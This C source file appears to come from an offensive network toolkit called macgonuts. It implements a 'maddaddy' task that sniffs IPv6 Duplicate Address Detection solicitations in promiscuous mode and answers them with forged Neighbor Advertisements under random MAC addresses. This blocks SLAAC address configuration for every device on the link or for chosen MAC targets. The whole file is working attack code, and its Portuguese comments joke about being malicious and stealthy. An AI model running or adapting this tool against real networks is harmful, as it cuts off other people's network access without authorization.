/*
 * Copyright (c) 2023, Rafael Santiago
 * All rights reserved.
 *
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree.
 */
#include <cmd/macgonuts_maddaddy_task.h>
#include <cmd/macgonuts_option.h>
#include <macgonuts_etherconv.h>
#include <macgonuts_socket_common.h>
#include <macgonuts_socket.h>
#include <macgonuts_icmphdr.h>
#include <macgonuts_ndphdr.h>
#include <macgonuts_ip6hdr.h>
#include <macgonuts_ethfrm.h>
#include <macgonuts_ipchsum.h>
#include <macgonuts_status_info.h>

static int g_QuitMadDaddy = 0;

static int do_mad_daddy(const char *iface, const uint8_t *hw_addrs, const size_t hw_addrs_size);

static inline int send_fake_na(const macgonuts_socket_t rsk,
                               const uint8_t *ethbuf, const ssize_t ethbuf_size, const uint8_t *target_addr);

static void sigint_watchdog(int signo);

static uint8_t *preprocess_targets_array(char **targets, const size_t targets_nr, size_t *macs_buf_size);

static uint8_t *preprocess_targets_array(char **targets, const size_t targets_nr, size_t *macs_buf_size);

static inline int is_solicited_node_multicast_link(const uint8_t *ethbuf, const ssize_t ethbuf_size);

static inline int is_solicited_node_multicast_proto(const uint8_t *ethbuf, const ssize_t ethbuf_size);

static inline int is_ndp_ns(const uint8_t *ethbuf, const ssize_t ethbuf_size, uint8_t *target_addr);

static inline int should_dad_go_bad(const uint8_t *ethbuf, const ssize_t ethbuf_size,
                                    const uint8_t *hw_addrs, const size_t hw_addrs_size);

int macgonuts_maddaddy_task(void) {
    int err = EXIT_FAILURE;
    const char *lo_iface = macgonuts_get_option("lo-iface", NULL);
    char **targets = NULL;
    size_t targets_nr = 0;
    uint8_t *hw_addrs = NULL;
    size_t hw_addrs_size = 0;

    if (lo_iface == NULL) {
        macgonuts_si_error("--lo-iface option is missing.\n");
        goto macgonuts_maddaddy_task_epilogue;
    }

    targets = macgonuts_get_array_option("targets", NULL, &targets_nr);
    if (targets != NULL) {
        hw_addrs = preprocess_targets_array(targets, targets_nr, &hw_addrs_size);
        macgonuts_free_array_option_value(targets, targets_nr);
        targets = NULL;
    }

    err = do_mad_daddy(lo_iface, hw_addrs, hw_addrs_size);

macgonuts_maddaddy_task_epilogue:

    if (hw_addrs != NULL) {
        free(hw_addrs);
    }

    if (targets != NULL) {
        macgonuts_free_array_option_value(targets, targets_nr);
    }

    return err;
}

int macgonuts_maddaddy_task_help(void) {
    macgonuts_si_print("use: macgonuts maddady --lo-iface=<label> [ --targets=<hw-addr-list> ]\n");
    return EXIT_SUCCESS;
}

static int do_mad_daddy(const char *iface, const uint8_t *hw_addrs, const size_t hw_addrs_size) {
    char buf[256];
    macgonuts_socket_t rsk = -1;
    uint8_t ethbuf[1<<10];
    ssize_t ethbuf_size = 0;
    uint8_t target_addr[16];

    if (macgonuts_get_addr_from_iface_unix(buf, sizeof(buf) - 1, 6, iface) != EXIT_SUCCESS) {
        macgonuts_si_error("interface `%s` does not support IPv6.\n");
        return EXIT_FAILURE;
    }

    if (macgonuts_set_iface_promisc_on(iface) != EXIT_SUCCESS) {
        macgonuts_si_error("unable to set %s to promisc mode.\n", iface);
        return EXIT_FAILURE;
    }

    rsk = macgonuts_create_socket(iface, 1);
    if (rsk == -1) {
        macgonuts_si_error("unable to create raw socket.\n");
        macgonuts_set_iface_promisc_off(iface);
        return EXIT_FAILURE;
    }

    macgonuts_si_mode_enter_announce("maddaddy");

    signal(SIGINT, sigint_watchdog);
    signal(SIGTERM, sigint_watchdog);

    while (!g_QuitMadDaddy) {
        ethbuf_size = macgonuts_recvpkt(rsk, ethbuf, sizeof(ethbuf));
        if (ethbuf_size > 0
            && is_solicited_node_multicast_link(ethbuf, ethbuf_size)
            && is_solicited_node_multicast_proto(ethbuf, ethbuf_size)
            && is_ndp_ns(ethbuf, ethbuf_size, &target_addr[0])
            && should_dad_go_bad(ethbuf, ethbuf_size, hw_addrs, hw_addrs_size)
            && send_fake_na(rsk, ethbuf, ethbuf_size, &target_addr[0]) == EXIT_SUCCESS) {
            (void)snprintf(buf, sizeof(buf) - 1,
                           "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X", ethbuf[ 6], ethbuf[ 7], ethbuf[ 8],
                                                            ethbuf[ 9], ethbuf[10], ethbuf[11]);
            macgonuts_si_info("SLAAC based network ingress was denied for device `%s`.\n", buf);
        }
        usleep(10);
    }

    macgonuts_release_socket(rsk);
    macgonuts_set_iface_promisc_off(iface);

    macgonuts_si_mode_leave_announce("maddaddy");

    return EXIT_SUCCESS;
}

static void sigint_watchdog(int signo) {
    g_QuitMadDaddy = 1;
}

static inline int send_fake_na(const macgonuts_socket_t rsk,
                               const uint8_t *ethbuf, const ssize_t ethbuf_size,
                               const uint8_t *target_addr) {
    struct macgonuts_ethfrm_ctx eth;
    struct macgonuts_ip6hdr_ctx ip6;
    struct macgonuts_icmphdr_ctx icmp6;
    struct macgonuts_ndp_nsna_hdr_ctx ndp;
    struct macgonuts_ip6_pseudo_hdr_ctx ip6phdr;
    int err = EXIT_FAILURE;
    size_t icmp_pkt_size = 0;
    unsigned char *fake_na = NULL;
    size_t fake_na_size = 0;

    assert(ethbuf_size > 54);

    memset(&eth, 0, sizeof(eth));
    memset(&ip6, 0, sizeof(ip6));
    memset(&icmp6, 0, sizeof(icmp6));
    memset(&ndp, 0, sizeof(ndp));
    memset(&ip6phdr, 0, sizeof(ip6phdr));

    ndp.reserv = 0x20000000; // INFO(Rafael): Override flag.
    ndp.options = (uint8_t *)malloc(8);
    if (ndp.options == NULL) {
        macgonuts_si_error("unable to allocate NDP options buffer.\n");
        goto send_fake_na_epilogue;
    }
    ndp.options_size = 8;

    ndp.options[0] = 0x02;
    ndp.options[1] = 0x01;
    // INFO(Rafael): Na linha do "Mad Daddy" dos The Cramps precisamos ser malvados e
    //               perversos e o mais stealth possivel, nao me chamo Dorothy... >:D
    //               Criancas fechem os olhos que o tio doido vai zaralhar o SLAAC do
    //               slack que nao configurou o IPv6 de forma menos carneiro...
    //               O unico slack que eh bom eh o ware, Slackware onde meu rio faz
    //               a curva! Linux sem systemd e rodinhas... Enfim, foco...
    if (macgonuts_getrandom_raw_ether_addr(&ndp.options[2], 6) != EXIT_SUCCESS) {
        macgonuts_si_error("unable to get random MAC address.\n");
        goto send_fake_na_epilogue;
    }
    memcpy((uint8_t *)&ndp.target_addr, &target_addr[0], 16);

    icmp6.type = kNDPMsgTypeNeighborAdvertisement;
    icmp6.code = 0;
    icmp6.payload = (uint8_t *)macgonuts_make_ndp_nsna_pkt(&ndp, &icmp6.payload_size);
    if (icmp6.payload == NULL) {
        macgonuts_si_error("unable to make NDP/NA packet.\n");
        goto send_fake_na_epilogue;
    }

    ip6.version = 6;
    ip6.next_header = 0x3A;
    ip6.hop_limit = 0xFF;

    memcpy(&ip6.src_addr[0], &target_addr[0], 16);

    ip6.dest_addr[0] = 0xFF; // INFO(Rafael): All nodes (link-local scope).
    ip6.dest_addr[1] = 0x02;
    ip6.dest_addr[15] = 0x01;

    memcpy(&ip6phdr.src_addr[0], &ip6.src_addr[0], sizeof(ip6phdr.src_addr));
    memcpy(&ip6phdr.dest_addr[0], &ip6.dest_addr[0], sizeof(ip6phdr.dest_addr));
    icmp_pkt_size = 4 + icmp6.payload_size;
    ip6phdr.upper_layer_pkt_len[0] = (icmp_pkt_size >> 24) & 0xFF;
    ip6phdr.upper_layer_pkt_len[1] = (icmp_pkt_size >> 16) & 0xFF;
    ip6phdr.upper_layer_pkt_len[2] = (icmp_pkt_size >>  8) & 0xFF;
    ip6phdr.upper_layer_pkt_len[3] = icmp_pkt_size & 0xFF;
    ip6phdr.next_header[3] = ip6.next_header;

    ip6.payload = (uint8_t *)macgonuts_make_icmp_pkt(&icmp6, &icmp_pkt_size, &ip6phdr, sizeof(ip6phdr));
    if (ip6.payload == NULL) {
        macgonuts_si_error("unable to make ICMP packet.\n");
        goto send_fake_na_epilogue;
    }
    ip6.payload_length = icmp_pkt_size & 0xFFFF;

    eth.dest_hw_addr[0] = 0x33;
    eth.dest_hw_addr[1] = 0x33;
    eth.dest_hw_addr[5] = 0x01;
    memcpy(&eth.src_hw_addr[0], &ndp.options[2], sizeof(eth.src_hw_addr)); // INFO(Rafael): Sentiu? Fedeu.
                                                                           //               Mas no modo stealth.
                                                                           //               "Entao relaxa, afina o
                                                                           //               violino, pega a gasolina
                                                                           //               e risca o fosforo"
                                                                           //                -- Nero (37 d.C segundos
                                                                           //                    antes de merdar tudo).
    eth.ether_type = MACGONUTS_ETHER_TYPE_IP6;

    eth.data = (uint8_t *)macgonuts_make_ip6_pkt(&ip6, &eth.data_size);
    if (eth.data == NULL) {
        macgonuts_si_error("unable to make IPv6 packet.\n");
        goto send_fake_na_epilogue;
    }

    fake_na = macgonuts_make_ethernet_frm(&eth, &fake_na_size);
    if (fake_na == NULL) {
        macgonuts_si_error("unable to make ethernet frame.\n");
        goto send_fake_na_epilogue;
    }

    if (macgonuts_sendpkt(rsk, fake_na, fake_na_size) == fake_na_size) {
        err = EXIT_SUCCESS; // MuHauHauhAUaHuAHAUhAUaHuHA!
    }

send_fake_na_epilogue: // INFO(Rafael): Com tanto comentario sincerao, isso aqui nem ficou tao ruim, hein?! :D

    if (fake_na != NULL) {
        free(fake_na);
    }

    macgonuts_release_ethfrm(&eth);
    macgonuts_release_ip6hdr(&ip6);
    macgonuts_release_icmphdr(&icmp6);
    macgonuts_release_ndp_nsna_hdr(&ndp);

    // WARN(Rafael): Viu? Desmistificou? Deu umas risadas? Entao blau! Desliga esse caiau e bora viver! ;)
    //               Vai pegar um pouco de Vitamina D seu ser sombrio!! Vai dar uma volta sem seu cosplay
    //               noturno de morcego, Vlad! Morrer de sedentarismo seria patetico! Serio mesmo...
    //               so dizendo... Fui!

    return err;
}

static uint8_t *preprocess_targets_array(char **targets, const size_t targets_nr, size_t *macs_buf_size) {
    char **target = targets;
    char **targets_end = targets + targets_nr;
    uint8_t *macs_buf = NULL;
    uint8_t *mp = NULL;

    *macs_buf_size = targets_nr * 6;
    macs_buf = (uint8_t *)malloc(*macs_buf_size);

    if (macs_buf == NULL) {
        macgonuts_si_error("unable to allocate MAC bufs list.\n");
        return NULL;
    }

    mp = macs_buf;

    while (target != targets_end) {
        if (macgonuts_get_raw_ether_addr(mp, 6, *target, strlen(*target)) != EXIT_SUCCESS) {
            macgonuts_si_error("unable to pre-process MAC `%s`.\n", *target);
            free(macs_buf);
            return NULL;
        }
        target++;
        mp += 6;
    }

    return macs_buf;
}

static inline int is_solicited_node_multicast_link(const uint8_t *ethbuf, const ssize_t ethbuf_size) {
    return (ethbuf_size > 14 && ethbuf[0] == 0x33 && ethbuf[1] == 0x33 && ethbuf[2] == 0xFF);
}

static inline int is_solicited_node_multicast_proto(const uint8_t *ethbuf, const ssize_t ethbuf_size) {
    return (ethbuf_size > 54 // INFO(Rafael): Ethernet frame size + IPv6 header size.
            && ethbuf[12     ] == 0x86 // INFO(Rafael): IPv6 ether type.
            && ethbuf[13     ] == 0xDD
            && ethbuf[14 + 24] == 0xFF // INFO(Rafael): Solicited node multicast address.
            && ethbuf[14 + 25] == 0x02
            && ethbuf[14 + 26] == 0x00
            && ethbuf[14 + 27] == 0x00
            && ethbuf[14 + 28] == 0x00
            && ethbuf[14 + 29] == 0x00
            && ethbuf[14 + 30] == 0x00
            && ethbuf[14 + 31] == 0x00
            && ethbuf[14 + 32] == 0x00
            && ethbuf[14 + 33] == 0x00
            && ethbuf[14 + 34] == 0x00
            && ethbuf[14 + 35] == 0x01
            && ethbuf[14 + 36] == 0xFF
            && ethbuf[14 + 37] == ethbuf[3]
            && ethbuf[14 + 38] == ethbuf[4]
            && ethbuf[14 + 39] == ethbuf[5]);
}

static inline int is_ndp_ns(const uint8_t *ethbuf, const ssize_t ethbuf_size, uint8_t *target_addr) {
    struct macgonuts_icmphdr_ctx icmp6;
    struct macgonuts_ndp_nsna_hdr_ctx ndp;
    int is = 0;

    assert(ethbuf_size > 54);

    memset(&icmp6, 0, sizeof(icmp6));
    memset(&ndp, 0, sizeof(ndp));

    if (macgonuts_read_icmp_pkt(&icmp6, &ethbuf[54], ethbuf_size - 54) != EXIT_SUCCESS
        || icmp6.type != kNDPMsgTypeNeighborSolicitation
        || icmp6.code != 0) {
        goto is_ndp_ns_epilogue;
    }

    if (macgonuts_read_ndp_nsna_pkt(&ndp, icmp6.payload, icmp6.payload_size) != EXIT_SUCCESS) {
        goto is_ndp_ns_epilogue;
    }

    is = (memcmp(&ndp.target_addr[0],
                (uint8_t *)"\xFE\x80\x00\x00\x00\x00\x00\x00",
                8) == 0); // INFO(Rafael): Does it seems a link local unicast address?

    if (is) {
        target_addr[ 0] = ndp.target_addr[0] & 0xFF;
        target_addr[ 1] = (ndp.target_addr[0] >> 8) & 0xFF;
        target_addr[ 2] = (ndp.target_addr[0] >> 16) & 0xFF;
        target_addr[ 3] = (ndp.target_addr[0] >> 24) & 0xFF;
        target_addr[ 4] = ndp.target_addr[1] & 0xFF;
        target_addr[ 5] = (ndp.target_addr[1] >> 8) & 0xFF;
        target_addr[ 6] = (ndp.target_addr[1] >> 16) & 0xFF;
        target_addr[ 7] = (ndp.target_addr[1] >> 24) & 0xFF;
        target_addr[ 8] = ndp.target_addr[2] & 0xFF;
        target_addr[ 9] = (ndp.target_addr[2] >> 8) & 0xFF;
        target_addr[10] = (ndp.target_addr[2] >> 16) & 0xFF;
        target_addr[11] = (ndp.target_addr[2] >> 24) & 0xFF;
        target_addr[12] = ndp.target_addr[3] & 0xFF;
        target_addr[13] = (ndp.target_addr[3] >> 8) & 0xFF;
        target_addr[14] = (ndp.target_addr[3] >> 16) & 0xFF;
        target_addr[15] = (ndp.target_addr[3] >> 24) & 0xFF;
    }

is_ndp_ns_epilogue:

    macgonuts_release_ndp_nsna_hdr(&ndp);
    macgonuts_release_icmphdr(&icmp6);

    return is;
}

static inline int should_dad_go_bad(const uint8_t *ethbuf, const ssize_t ethbuf_size,
                                    const uint8_t *hw_addrs, const size_t hw_addrs_size) {
    const uint8_t *curr_hw_addr = NULL;
    const uint8_t *hw_addrs_end = hw_addrs + hw_addrs_size;
    int go_bad = 0;

    assert(ethbuf_size > 14);

    if (hw_addrs == NULL || hw_addrs_size == 0) {
        return 1;
    }

    curr_hw_addr = hw_addrs;
    while (curr_hw_addr < hw_addrs_end && !go_bad) {
        go_bad = (memcmp(&ethbuf[6], curr_hw_addr, 6) == 0);
        curr_hw_addr += 6;
    }

    return go_bad;
}
